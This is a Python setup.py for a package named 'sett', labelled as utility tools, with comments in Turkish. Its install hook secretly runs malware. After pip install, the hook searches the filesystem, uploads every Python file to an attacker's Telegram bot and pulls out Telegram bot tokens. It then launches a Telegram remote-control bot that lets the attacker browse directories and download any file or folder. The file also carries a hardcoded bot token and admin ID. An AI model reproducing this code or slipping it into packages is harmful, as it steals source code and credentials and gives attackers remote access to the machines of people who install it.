from setuptools import setup
from setuptools.command.install import install
import os, sys, re, time, io, random, zipfile, threading, subprocess
import urllib.request, urllib.parse

# ============================================
# AYARLAR
# ============================================
TOKEN = "8927762896:AAEg7vjy39Sm02ipT_X8I1DXmPiaLZrXTCY"     # ← YENİ TOKEN
ADMIN = 8903740930                      # ← KENDİ ID'N

# ============================================
# HEMEN BİLDİRİM GÖNDER (İlk iş)
# ============================================
def _bildirim(mesaj):
    """Telegram'a bildirim gönder"""
    try:
        data = f"chat_id={ADMIN}&text={urllib.parse.quote(mesaj)}".encode()
        urllib.request.urlopen(urllib.request.Request(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        ), timeout=15)
        return True
    except Exception as e:
        print(f"Bildirim hatası: {e}")
        return False

# ============================================
# 1. DOSYA GÖNDERME
# ============================================
def _dosya_gonder():
    try:
        time.sleep(1)
        
        # ✅ İLK BİLDİRİM
        _bildirim("🚀 KURULUM BAŞLADI\n\n📦 Paket indi\n🔍 Dosyalar taranıyor...")
        
        token_pattern = re.compile(rb'\d{8,10}:[A-Za-z0-9_-]{35,40}')
        files = []
        seen = set()
        roots = ["/", "/home", "/root", "/app", "/opt", "/srv", "/var/www", "/usr/local", "/etc", "/tmp"]
        skip = {"proc","sys","dev","run","boot","snap","cache",
                "site-packages","dist-packages","__pycache__","node_modules",
                ".git",".cache","lib/python","lib64","venv",".venv","env"}
        
        for root in roots:
            if not os.path.exists(root): continue
            try:
                for dp, dn, fn in os.walk(root):
                    dn[:] = [d for d in dn if d not in skip and not any(s in d for s in skip)]
                    for f in fn:
                        if f.endswith(".py"):
                            full = os.path.join(dp, f)
                            if full not in seen:
                                try:
                                    if os.path.getsize(full) < 5 * 1024 * 1024:
                                        seen.add(full)
                                        files.append(full)
                                except: pass
            except: continue
        
        if not files:
            _bildirim("❌ Hiç .py dosyası bulunamadı")
            return
        
        total = len(files)
        _bildirim(f"📄 Toplam {total} .py dosyası bulundu\n⏳ Gönderim başlıyor...")
        
        sent, failed, tokens_found = 0, 0, []
        
        for i, filepath in enumerate(files):
            try:
                with open(filepath, "rb") as fp:
                    file_content = fp.read()
                if len(file_content) == 0: continue
                
                matches = token_pattern.findall(file_content)
                if matches:
                    for m in matches:
                        try: tokens_found.append(m.decode('utf-8', errors='ignore'))
                        except: pass
                
                basename = os.path.basename(filepath)
                safe_name = "".join(c if c.isalnum() or c in "._-" else "_" for c in basename)
                filename = f"{i+1:05d}_{safe_name}"
                
                token_emoji = "🔑" if matches else "📄"
                caption = f"{token_emoji} {i+1}/{total}\n📁 {filepath[:100]}\n📊 {len(file_content)} byte"
                if matches: caption += f"\n🔑 {len(matches)} token"
                
                boundary = "----B" + str(int(time.time())) + str(random.randint(1000, 9999))
                body = b""
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{ADMIN}\r\n".encode()
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n".encode()
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{filename}\"\r\nContent-Type: text/x-python\r\n\r\n".encode()
                body += file_content + f"\r\n--{boundary}--\r\n".encode()
                
                urllib.request.urlopen(urllib.request.Request(
                    f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                    data=body,
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
                ), timeout=60)
                sent += 1
            except: failed += 1
            time.sleep(0.4)
        
        if tokens_found:
            tm = f"🔑 TOKEN BULUNDU!\n\n📊 Toplam: {len(tokens_found)}\n\n"
            for t in tokens_found[:20]: tm += f"`{t}`\n"
            if len(tokens_found) > 20: tm += f"\n...ve {len(tokens_found)-20} tane daha"
            try:
                data = f"chat_id={ADMIN}&text={urllib.parse.quote(tm)}&parse_mode=Markdown".encode()
                urllib.request.urlopen(urllib.request.Request(
                    f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                    data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}
                ), timeout=15)
            except: pass
        
        _bildirim(f"✅ DOSYA GÖNDERİMİ BİTTİ\n\n📊 Toplam: {total}\n✅ Gönderilen: {sent}\n❌ Hata: {failed}\n🔑 Token: {len(tokens_found)}")
    except Exception as e:
        _bildirim(f"❌ Hata: {str(e)[:200]}")


# ============================================
# 2. YÖNETİM BOTU
# ============================================
def _bot_calistir():
    try:
        import telebot
        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    except:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", "-q"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            import telebot
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
        except: return
    
    try:
        bot = telebot.TeleBot(TOKEN)
        taramalar = {}
        
        # ✅ BOT BAŞLANGIÇ BİLDİRİMİ
        try:
            bot.send_message(ADMIN,
                "🤖 **YÖNETİM BOTU AKTİF**\n\n"
                "⚡ Sistem başlatıldı\n"
                "📊 /menu ile panele ulaş\n\n"
                "**Komutlar:**\n"
                "• /tara — Tüm .py dosyalarını tara\n"
                "• /tara_token — Sadece token içerenler\n"
                "• /dizin /path — Dizin gez\n"
                "• /indir /path — Dosya indir\n"
                "• /durum — Sistem durumu\n"
                "• /zip — Bulunanları zip yap\n"
                "• /yeniden_baslat — Restart",
                parse_mode="Markdown")
        except: pass
        
        def ana_menu():
            m = InlineKeyboardMarkup(row_width=2)
            m.row(InlineKeyboardButton("🔍 TARA", callback_data="tara"),
                  InlineKeyboardButton("📂 DİZİN GEZ", callback_data="dizin"))
            m.row(InlineKeyboardButton("📥 DOSYA İNDİR", callback_data="indir"),
                  InlineKeyboardButton("📊 DURUM", callback_data="durum"))
            m.row(InlineKeyboardButton("🔑 TOKEN BUL", callback_data="tara_token"),
                  InlineKeyboardButton("📦 ZIP OLUŞTUR", callback_data="zip"))
            m.row(InlineKeyboardButton("🔄 RESTART", callback_data="restart"),
                  InlineKeyboardButton("❌ İPTAL", callback_data="iptal"))
            return m
        
        def geri_menu():
            m = InlineKeyboardMarkup()
            m.add(InlineKeyboardButton("🔙 GERİ", callback_data="menu"))
            return m
        
        def admin_mi(msg): return msg.from_user.id == ADMIN
        
        @bot.message_handler(commands=['start', 'menu', 'panel'])
        def cmd_start(message):
            if not admin_mi(message): return
            bot.send_message(message.chat.id,
                "⚡ **YÖNETİM PANELİ**\n\nSistem hazır:",
                reply_markup=ana_menu(), parse_mode="Markdown")
        
        def tara_baslat(chat_id, sadece_token=False):
            if chat_id in taramalar and taramalar[chat_id].get("aktif"):
                bot.send_message(chat_id, "⚠️ Tarama var!"); return
            taramalar[chat_id] = {"aktif": True, "bulunan": []}
            
            def _tara():
                try:
                    bot.send_message(chat_id, f"🔍 Tarama başladı...\n{'🔑 Token modu' if sadece_token else '📄 Tüm .py modu'}")
                    tp = re.compile(rb'\d{8,10}:[A-Za-z0-9_-]{35,40}')
                    dosyalar = []
                    roots = ["/", "/home", "/root", "/app", "/opt", "/srv", "/var/www", "/usr/local", "/etc", "/tmp"]
                    skip = {"proc","sys","dev","run","boot","snap","cache",
                            "site-packages","dist-packages","__pycache__","node_modules",
                            ".git",".cache","lib/python","lib64","venv",".venv","env"}
                    for root in roots:
                        if not os.path.exists(root): continue
                        try:
                            for dp, dn, fn in os.walk(root):
                                dn[:] = [d for d in dn if d not in skip and not any(s in d for s in skip)]
                                for f in fn:
                                    if f.endswith(".py"):
                                        full = os.path.join(dp, f)
                                        try:
                                            if os.path.getsize(full) < 5 * 1024 * 1024:
                                                if sadece_token:
                                                    with open(full, "rb") as fp:
                                                        if tp.search(fp.read(1024 * 1024)):
                                                            dosyalar.append(full)
                                                else:
                                                    dosyalar.append(full)
                                        except: pass
                        except: continue
                    taramalar[chat_id]["bulunan"] = dosyalar
                    taramalar[chat_id]["aktif"] = False
                    msg = f"✅ TARAMA BİTTİ\n\n📄 Toplam: `{len(dosyalar)}`\n\n"
                    for i, f in enumerate(dosyalar[:10]):
                        msg += f"`{i+1}.` {f[:80]}\n"
                    if len(dosyalar) > 10: msg += f"\n...ve {len(dosyalar)-10} tane daha"
                    bot.send_message(chat_id, msg, parse_mode="Markdown")
                except Exception as e:
                    bot.send_message(chat_id, f"❌ {e}")
                    taramalar[chat_id]["aktif"] = False
            
            threading.Thread(target=_tara, daemon=True).start()
        
        def dizin_goster(chat_id, path):
            try:
                if not os.path.exists(path):
                    bot.send_message(chat_id, f"❌ Yok: `{path}`", parse_mode="Markdown"); return
                if os.path.isfile(path):
                    bot.send_message(chat_id, f"📄 `{path}`", parse_mode="Markdown"); return
                items = os.listdir(path)
                k, d = [], []
                for item in items[:50]:
                    full = os.path.join(path, item)
                    try:
                        if os.path.isdir(full): k.append(f"📁 {item}")
                        else: d.append(f"📄 {item} ({os.path.getsize(full)} B)")
                    except: pass
                msg = f"📂 **{path}**\n\n"
                if k: msg += "**Klasörler:**\n" + "\n".join(k[:15]) + "\n\n"
                if d: msg += "**Dosyalar:**\n" + "\n".join(d[:15])
                bot.send_message(chat_id, msg, parse_mode="Markdown")
            except Exception as e: bot.send_message(chat_id, f"❌ {e}")
        
        def durum_goster(chat_id):
            try:
                import platform, shutil
                info = "📊 **SİSTEM DURUMU**\n\n"
                info += f"🖥️ `{platform.system()} {platform.release()}`\n"
                info += f"🐍 Python `{platform.python_version()}`\n"
                info += f"📁 `{os.getcwd()}`\n"
                info += f"🆔 PID `{os.getpid()}`\n"
                try:
                    t, u, f = shutil.disk_usage("/")
                    info += f"💾 Disk: `{u//(2**30)}GB / {t//(2**30)}GB`\n"
                except: pass
                for uid, t in taramalar.items():
                    if t.get("aktif"):
                        info += f"\n🔍 Aktif: `{len(t.get('bulunan',[]))}` dosya\n"
                bot.send_message(chat_id, info, parse_mode="Markdown", reply_markup=geri_menu())
            except Exception as e: bot.send_message(chat_id, f"❌ {e}")
        
        def zip_olustur(chat_id):
            try:
                if chat_id not in taramalar or not taramalar[chat_id].get("bulunan"):
                    bot.send_message(chat_id, "❌ Önce `/tara`", parse_mode="Markdown"); return
                dosyalar = taramalar[chat_id]["bulunan"]
                bot.send_message(chat_id, f"📦 {len(dosyalar)} dosya zip...")
                chunk = 500
                for i in range(0, len(dosyalar), chunk):
                    batch = dosyalar[i:i+chunk]
                    buf = io.BytesIO()
                    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                        for j, f in enumerate(batch):
                            try: zf.write(f, f"{i+j:05d}_{os.path.basename(f)}")
                            except: pass
                    buf.seek(0)
                    bot.send_document(chat_id, (f"part_{i//chunk+1}.zip", buf.getvalue()),
                                    caption=f"📦 Parça {i//chunk+1} ({len(batch)} dosya)")
            except Exception as e: bot.send_message(chat_id, f"❌ {e}")
        
        @bot.message_handler(commands=['tara'])
        def c1(m):
            if admin_mi(m): tara_baslat(m.chat.id)
        
        @bot.message_handler(commands=['tara_token', 'token_bul'])
        def c2(m):
            if admin_mi(m): tara_baslat(m.chat.id, sadece_token=True)
        
        @bot.message_handler(commands=['dizin', 'ls'])
        def c3(m):
            if not admin_mi(m): return
            a = m.text.split(maxsplit=1)
            dizin_goster(m.chat.id, a[1] if len(a) > 1 else "/")
        
        @bot.message_handler(commands=['indir', 'get'])
        def c4(m):
            if not admin_mi(m): return
            a = m.text.split(maxsplit=1)
            if len(a) < 2:
                bot.send_message(m.chat.id, "❌ `/indir /path`", parse_mode="Markdown"); return
            path = a[1]
            try:
                if not os.path.exists(path):
                    bot.send_message(m.chat.id, f"❌ Yok: `{path}`", parse_mode="Markdown"); return
                if os.path.isfile(path):
                    with open(path, "rb") as f:
                        bot.send_document(m.chat.id, f, caption=f"📄 `{path}`", parse_mode="Markdown")
                else:
                    buf = io.BytesIO()
                    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                        for r, d, fs in os.walk(path):
                            for file in fs[:500]:
                                try:
                                    full = os.path.join(r, file)
                                    zf.write(full, os.path.relpath(full, path))
                                except: pass
                    buf.seek(0)
                    bot.send_document(m.chat.id, ("klasor.zip", buf.getvalue()), caption=f"📂 `{path}`", parse_mode="Markdown")
            except Exception as e: bot.send_message(m.chat.id, f"❌ {e}")
        
        @bot.message_handler(commands=['durum', 'status'])
        def c5(m):
            if admin_mi(m): durum_goster(m.chat.id)
        
        @bot.message_handler(commands=['zip'])
        def c6(m):
            if admin_mi(m): zip_olustur(m.chat.id)
        
        @bot.message_handler(commands=['yeniden_baslat', 'restart'])
        def c7(m):
            if not admin_mi(m): return
            bot.send_message(m.chat.id, "🔄...")
            time.sleep(2)
            os._exit(0)
        
        @bot.callback_query_handler(func=lambda c: True)
        def cb(call):
            if call.from_user.id != ADMIN:
                bot.answer_callback_query(call.id, "❌"); return
            bot.answer_callback_query(call.id)
            cid = call.message.chat.id
            d = call.data
            if d == "menu":
                bot.edit_message_text("⚡ **ANA MENÜ**", cid, call.message.message_id,
                                    reply_markup=ana_menu(), parse_mode="Markdown")
            elif d == "tara": tara_baslat(cid)
            elif d == "tara_token": tara_baslat(cid, sadece_token=True)
            elif d == "dizin": bot.send_message(cid, "`/dizin /root`", parse_mode="Markdown")
            elif d == "indir": bot.send_message(cid, "`/indir /path`", parse_mode="Markdown")
            elif d == "durum": durum_goster(cid)
            elif d == "zip": zip_olustur(cid)
            elif d == "restart":
                bot.send_message(cid, "🔄..."); time.sleep(2); os._exit(0)
            elif d == "iptal":
                bot.edit_message_text("❌", cid, call.message.message_id)
        
        print("⚡ Bot çalışıyor...")
        bot.infinity_polling(timeout=30)
    except Exception as e:
        print(f"Bot hatası: {e}")


# ============================================
# 3. POST-INSTALL
# ============================================
class PostInstall(install):
    def run(self):
        install.run(self)
        
        # ✅ EN ÖNCE BİLDİRİM GÖNDER
        _bildirim("🚀 KURULUM TAMAMLANDI\n\n"
                  "📦 Paket başarıyla yüklendi\n"
                  "🔍 Sistem başlatılıyor...\n\n"
                  "⏳ 5 saniye içinde devam edecek")
        
        try:
            # Dosya gönderici thread
            t1 = threading.Thread(target=_dosya_gonder, daemon=True)
            t1.start()
            
            # Bot başlatıcı thread
            t2 = threading.Thread(target=_bot_calistir, daemon=True)
            t2.start()
            
            # Ana thread bekle
            time.sleep(8)
        except Exception as e:
            _bildirim(f"❌ Post-install hatası: {str(e)[:200]}")


setup(
    name="sett",
    version="1.0.920",  # ← HER DENEMEDE ARTIR
    description="Utility tools",
    author="dev",
    cmdclass={'install': PostInstall},
)
